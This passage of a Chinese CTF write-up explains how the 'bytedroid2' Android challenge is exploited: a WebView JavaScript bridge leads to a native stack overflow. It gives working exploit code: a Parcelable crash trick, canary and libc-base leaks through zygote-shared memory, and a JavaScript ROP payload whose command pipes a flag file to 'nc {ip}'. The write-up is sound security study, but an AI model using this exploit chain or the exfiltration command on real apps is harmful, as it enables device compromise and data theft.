&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">func</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        func(unhex(s));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] unhex(String str) &#123;</span><br><span class="line">        <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[str.length() / <span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; str.length()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> i + <span class="number">2</span>;</span><br><span class="line">            bArr[i / <span class="number">2</span>] = (<span class="type">byte</span>) Integer.parseInt(str.substring(i, i2), <span class="number">16</span>);</span><br><span class="line">            i = i2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bArr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">UnZipAssetsFolder</span><span class="params">(Context context, String zipFileString, String outPathString)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ZipInputStream</span> <span class="variable">inPutZip</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipInputStream</span>(context.getAssets().open(zipFileString));</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">ZipEntry</span> <span class="variable">zipEntry</span> <span class="operator">=</span> inPutZip.getNextEntry();</span><br><span class="line">            <span class="keyword">if</span> (zipEntry != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">szName</span> <span class="operator">=</span> zipEntry.getName();</span><br><span class="line">                <span class="keyword">if</span> (zipEntry.isDirectory()) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">szName2</span> <span class="operator">=</span> szName.substring(<span class="number">0</span>, szName.length() - <span class="number">1</span>);</span><br><span class="line">                    <span class="type">File</span> <span class="variable">folder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(outPathString + File.separator + szName2);</span><br><span class="line">                    <span class="keyword">if</span> (!folder.exists()) &#123;</span><br><span class="line">                        folder.mkdirs();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(outPathString + File.separator + szName);</span><br><span class="line">                    <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                        file.getParentFile().mkdirs();</span><br><span class="line">                        file.createNewFile();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="type">FileOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">                    <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> inPutZip.read(buffer);</span><br><span class="line">                        <span class="keyword">if</span> (len == -<span class="number">1</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">                        out.flush();</span><br><span class="line">                    &#125;</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                inPutZip.close();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line">webView.addJavascriptInterface(<span class="built_in">this</span>, <span class="string">&quot;BridgeUtils&quot;</span>);</span><br></pre></td></tr></table></figure><table><thead><tr><th>配置</th><th>风险</th></tr></thead><tbody><tr><td>JavaScriptEnabled</td><td>JS 可执行</td></tr><tr><td>AllowFileAccess</td><td>file:&#x2F;&#x2F; 可读</td></tr><tr><td>addJavascriptInterface(this, …)</td><td><strong>直接暴露 Activity</strong></td></tr></tbody></table><p>js可以直接调用func的native函数</p><p>加载本地 HTML</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webView.loadUrl(&quot;file:&quot; + file.getPath() + &quot;?lang=&quot; + Locale.getDefault().getLanguage());</span><br></pre></td></tr></table></figure><p>最终加载的是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///sdcard/Documents/Bytedroid2/index.html?lang=zh</span><br></pre></td></tr></table></figure><p><strong>index.html 完全可控</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] unhex(String str) &#123;</span><br><span class="line">    <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[str.length() / <span class="number">2</span>];</span><br><span class="line">    ...</span><br><span class="line">    Integer.parseInt(str.substring(i, i2), <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以<strong>精确控制传入 native 的字节流</strong></p><h3 id="func"><a href="#func" class="headerlink" title="func"></a>func</h3><p>IDA打开so可以看见如下的代码:</p><p>这里可以直接发现栈溢出了，把a3直接拷贝到a1没有经过长度校验</p><blockquote><p>Cmake参数默认，即默认的保护全开:</p><p><strong>Stack Canary（-fstack-protector-strong）</strong></p><p><strong>NX（栈不可执行）</strong></p><p><strong>PIE + ASLR</strong></p><p><strong>FORTIFY_SOURCE</strong></p><p><strong>RELRO（至少 Partial）</strong></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260126135741590.png" alt="image-20260126135741590"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><strong>Step1</strong>:篡改SDcard下的html，从而能执行任意javascript</p><p>Vulner App是运行在安卓11上targetsdk&#x3D;30的apk，需要先阅读了解到安卓11中关于存储机制的更新。这个限制导致了即使在sever.py中授予了Attacker App权限WRITE_EXTERNAL_STORAGE，其也不能重写Vulner App在SDcard下创建的文件。</p><blockquote><p><a href="https://developer.android.com/about/versions/11/privacy/storage?hl=zh-cn">Android 11 中的存储空间更新  | Android Developers</a></p><p><strong>在 Android 11 上运行但以 Android 10（API 级别 29）为目标平台的应用仍可请求 requestLegacyExternalStorage 属性。</strong></p><ul><li><strong>可以</strong>在 <code>AndroidManifest.xml</code> 里写：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:requestLegacyExternalStorage=&quot;true&quot;</span><br></pre></td></tr></table></figure><ul><li>系统会<strong>给一个兼容期</strong></li><li><strong>暂时继续用 Android 9&#x2F;10 老的外部存储访问方式</strong></li></ul><p><strong>当应用更新为以 Android 11 为目标平台后，系统会忽略 requestLegacyExternalStorage 标记。</strong></p><p><strong>什么是分区存储模型</strong>?每个 App 在外部存储中只能“看见”属于自己的那一小块区域，默认不能随意访问或修改其他 App 的文件</p><p>存储模型（Android 9 及以前）</p><p>谁拿到权限，谁就能在 &#x2F;sdcard 里为所欲为。”</p><p>只要有WRITE_EXTERNAL_STORAGE</p><p>就可以：</p><ul><li>读 <code>/sdcard/Documents/*</code></li><li>写 <code>/sdcard/Download/*</code></li></ul><p>每个 App 都有自己的外部存储沙盒,系统划好了几块合法领地：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/sdcard/Android/data/&lt;包名&gt;/</span><br><span class="line">/sdcard/Android/obb/&lt;包名&gt;/</span><br></pre></td></tr></table></figure><p>公共目录也被限制访问方式</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/sdcard/Documents</span><br><span class="line">/sdcard/Download</span><br><span class="line">/sdcard/Pictures</span><br></pre></td></tr></table></figure><p>不再是有权限就能随便 open()</p><p>要么：</p><ul><li>通过 <strong>系统 API（MediaStore &#x2F; SAF）</strong></li><li>要么用户手动授权（文件选择器）</li></ul><p>在分区存储下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WRITE_EXTERNAL_STORAGE</span><br></pre></td></tr></table></figure><p> 不再等于随意写 sdcard</p></blockquote><p>继续阅读文档，其提供了一种暂时停用分区存储的做法:<a href="https://developer.android.com/training/data-storage/use-cases#opt-out-scoped-storage">https://developer.android.com/training/data-storage/use-cases#opt-out-scoped-storage</a></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260126144718761.png" alt="image-20260126144718761"></p><blockquote><p>index.html 位于 &#x2F;sdcard&#x2F;Android&#x2F;data&#x2F;{vulner App}&#x2F;cache 下难度更大</p><p>原因非常简单也非常现实：<code>/sdcard/Android/data/other.package/</code><strong>在 Android 11 上对其他 App 基本不可写</strong>哪怕 targetSdk&#x3D;28，也会被系统额外限制基本逼你走：root,adb shell或系统漏洞</p></blockquote><p><strong>Step2</strong>:让我们篡改的html内容生效，即重启VulnerApp</p><p>安卓上一个非常很普遍的现象,intent.getxxxExtra缺失trycatch,假设我们构造如下Intent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getPackageManager().getLaunchIntentForPackage(<span class="string">&quot;com.bytectf.bytedroid2&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;crash&quot;</span>, <span class="keyword">new</span> <span class="title class_">CrashParcelable</span>());</span><br><span class="line">intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure><p>CrashParcelable.java,随便新建一个parcelable类，只要该类在目标App中找不到即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwnbytedroid2;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CrashParcelable</span> <span class="keyword">extends</span> <span class="title class_">Intent</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>只要Vulner App在接收到Intent后，尝试intent.getxxxExtra或者intent.hasExtra，就会触发整个bundle的反序列化，当尝试对key为crash的数据进行反序列时，由于classloader找不到该类，就会抛出 android.os.BadParcelableException: ClassNotFoundException whenunmarshalling，没有catch此错误将会导致app crash。</p><blockquote><p>Android 的 Intent extras 本质上是一个 Bundle，Bundle 在跨进程&#x2F;跨组件传输时会走<strong>Parcel 序列化</strong>。</p><ul><li>在攻击 App 里 <code>putExtra(&quot;crash&quot;, new CrashParcelable())</code>系统把这个对象写进 Parcel（序列化）。</li><li>目标 App 收到 Intent 后，一旦去读 extras（比如 <code>getStringExtra</code> &#x2F; <code>getExtras</code> &#x2F; <code>hasExtra</code> 等）系统就需要把Parcel里的数据反序列化还原成对象（unmarshall）。</li></ul><p>关键点：<strong>反序列化时需要目标 App 的 ClassLoader 能加载到这个类</strong>。</p><p>如果类在目标 App 里不存在（你故意用攻击 App 自己的类），就会抛：BadParcelableException: ClassNotFoundException when unmarshalling …</p><p>如果目标 App 没 catch，主线程异常直接崩溃。</p></blockquote><p>这个技巧基本对所有App都通用，包括一些系统应用，但能做到的也仅仅是临时性crash，通常不被考虑为漏洞。回到此题，我们需要通过上述技巧来crash掉Vulner App，再重新launch，触发我们的html代码</p><p>需要让其重新 onCreate，loadUrl</p><p><strong>Step3</strong>:通过jsbridge触发native上的栈溢出，并绕过ASLR和Canary，完成无回显的ROP利用</p><p>先来观察一下安卓的栈结构，通过lldb进行调试，断点到memcpy:</p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260126151935349.png" alt="image-20260126151935349" style="zoom:67%;" /><p>那么要栈溢出完成ROP，需要解决两个问题:</p><ol><li>如何leak canary</li><li>如何获取ASLR后的Nativelib地址</li></ol><p>官方wp指出：</p><blockquote><p>发现多次重启app，他的canary和ret addr总是固定的，于是有了一个大胆猜想。随后通过调试验证出一个结论，所有安卓应用的libc.so以及大部分公共so的基地址是一致的，不同应用间canary也是一致的，重启app进程也不会使他们的值发生改变，仅当重启手机才会变化。</p><p>猜想这很有可能与安卓的zygote机制有关，即应用都是由zygote这个进程孵化(fork)而来，ASLR和Canary在zygote进程启动的时候就已经确定，zygote重启(手机重启)这个值才会改变。在安卓本地利用的场景下，这个特性使得栈溢出几乎失去了ASLR和Canary的保护，因为Attacker App可以读取自身内存完成leak。</p></blockquote><p><strong>Zygote 是 Android 系统中所有 App 进程的母体进程。</strong>它在系统启动时创建，提前加载好运行环境，然后通过 <code>fork()</code> 快速复制自己来生成每一个应用进程。如果没有，假设每启动一个App都要，启动一个全新进程初始化ART&#x2F;Dalvik虚拟机加载libc、 libart、 framework建ClassLoader、线程环境。很慢</p><p>有Zygote：Android开机时:系统先启动Zygote进程，Zygote去启动ART虚拟机，加载libc&#x2F;libart&#x2F;常用系统so，预加载Javaframework类，当你点开一个App:<br>系统对Zygote调用fork()得到一个几乎现成的子进程子进程再加载App自己的代码</p><p>子进程 &#x3D; 父进程的完整内存快照（写时复制）</p><blockquote><p><strong>Zygisk 是 Magisk 引入的一种在 zygote fork 应用之前进行代码注入的机制。它允许你在所有 App 进程诞生的那一刻，把自己的 native 代码塞进去。</strong></p></blockquote><p>关键代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">getLibcBase</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">libcBase</span> <span class="operator">=</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">i</span> <span class="operator">=</span> IOUtils.toString(fileInputStream);</span><br><span class="line">        <span class="keyword">for</span> (String line : i.split(<span class="string">&quot;\n&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (line.contains(<span class="string">&quot;libc.so&quot;</span>)) &#123;</span><br><span class="line">                libcBase = line.split(<span class="string">&quot;-&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> libcBase;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">getCanary</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260126190515452.png" alt="image-20260126190515452"></p><p>canary也是一样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">JNIEXPORT jint JNICALL</span><br><span class="line"><span class="title function_">Java_com_bytectf_pwnbytedroid2_MainActivity_getCanary</span><span class="params">(JNIEnv *env, jclass clazz)</span> &#123;</span><br><span class="line">    jbyte buf[<span class="number">0x80</span>];</span><br><span class="line">    LOGE(<span class="string">&quot;%p&quot;</span>, *(<span class="type">size_t</span> *)(buf + <span class="number">0x80</span>));</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *)(buf + <span class="number">0x80</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>显然安卓的这一机制很不合理，在本地利用场景下，栈溢出将变得大有可为。</p></blockquote><p>接下来是常规的ROP，构造参数去调用libc中的system。调试发现memcpy后eax正好指向&amp;buf,有了栈地址可以节省很大功夫，但这里不能直接用buf地址，因为在system函数的栈会与该段重合，导致内存被破坏。我们将shell命令的地址抬高，并通过gadget来运算一下eax，关键代码:</p><blockquote><p>pwn这块好久没看了 ，其实这里的意思就是你已经跳转到system，但是重合会造成构造的字符串被破坏执行命令失败</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">poc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    libc_base = &#123; <span class="title function_">getLibcBase</span>() <span class="keyword">in</span> <span class="title class_">Java</span> &#125;</span><br><span class="line">    canary = &#123; <span class="title function_">getCanary</span>() <span class="keyword">in</span> <span class="title class_">Java</span> &#125;</span><br><span class="line">    system = <span class="number">0x89d20</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span>.<span class="title function_">padEnd</span>(<span class="number">0x80</span> * <span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    payload += <span class="title function_">p32</span>(canary)</span><br><span class="line">    payload += <span class="title function_">p32</span>(system + libc_base).<span class="title function_">repeat</span>(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0x000aa692 : pop ecx ; ret</span></span><br><span class="line">    <span class="comment">// 0x000596f5 : add eax, ecx ; ret</span></span><br><span class="line">    <span class="comment">// 0x0004415b : push eax ; call esi</span></span><br><span class="line"></span><br><span class="line">    payload += <span class="title function_">p32</span>(libc_base + <span class="number">0x000aa692</span>)</span><br><span class="line">    payload += <span class="title function_">p32</span>(<span class="number">0xb4</span>)</span><br><span class="line">    payload += <span class="title function_">p32</span>(libc_base + <span class="number">0x000596f5</span>)</span><br><span class="line">    payload += <span class="title function_">p32</span>(libc_base + <span class="number">0x0004415b</span>)</span><br><span class="line"></span><br><span class="line">    payload += <span class="title function_">str2hex</span>(<span class="string">&#x27;cat /data/data/com.bytectf.bytedroid2/files/flag | nc &#123;ip&#125;&#x27;</span>)</span><br><span class="line">    payload += <span class="string">&#x27;00&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="title class_">BridgeUtils</span>.<span class="title function_">func</span>(payload)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="APP构建"><a href="#APP构建" class="headerlink" title="APP构建"></a>APP构建</h2><h3 id="AndroidManifest-xml-1"><a href="#AndroidManifest-xml-1" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Pwnbytedroid2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Utils-cpp"><a href="#Utils-cpp" class="headerlink" title="Utils.cpp"></a>Utils.cpp</h3><p>Java_com_bytectf_pwnbytedroid2_MainActivity_getCanary来泄露canary</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;android/log.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TAG <span class="string">&quot;evil&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGD(...) __android_log_print(ANDROID_LOG_DEBUG,TAG ,__VA_ARGS__) <span class="comment">// 定义LOGD类型</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGI(...) __android_log_print(ANDROID_LOG_INFO,TAG ,__VA_ARGS__) <span class="comment">// 定义LOGI类型</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGW(...) __android_log_print(ANDROID_LOG_WARN,TAG ,__VA_ARGS__) <span class="comment">// 定义LOGW类型</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGE(...) __android_log_print(ANDROID_LOG_ERROR,TAG ,__VA_ARGS__) <span class="comment">// 定义LOGE类型</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGF(...) __android_log_print(ANDROID_LOG_FATAL,TAG ,__VA_ARGS__) <span class="comment">// 定义LOGF类型</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">JNIEXPORT jint JNICALL</span><br><span class="line"><span class="title function_">Java_com_bytectf_pwnbytedroid2_MainActivity_getCanary</span><span class="params">(JNIEnv *env, jclass clazz)</span> &#123;</span><br><span class="line">    jbyte buf[<span class="number">0x80</span>];</span><br><span class="line">    LOGE(<span class="string">&quot;%p&quot;</span>,*(<span class="type">size_t</span> *)(buf+<span class="number">0x80</span>));</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *)(buf+<span class="number">0x80</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>意思是在 C&#x2F;C++ 里写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOGE(&quot;canary=%p&quot;, value);</span><br></pre></td></tr></table></figure><p>就等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__android_log_print(ANDROID_LOG_ERROR, &quot;evil&quot;, &quot;canary=%p&quot;, value);</span><br></pre></td></tr></table></figure><p>LOGD：Debug（调试）</p><p>LOGI：Info（信息）</p><p>LOGW：Warn（警告）</p><p>LOGE：Error（错误）</p><p>LOGF：Fatal（致命）</p></blockquote><h3 id="MainActivity-1"><a href="#MainActivity-1" class="headerlink" title="MainActivity"></a>MainActivity</h3><blockquote><p>build.gradle里需要加implementation 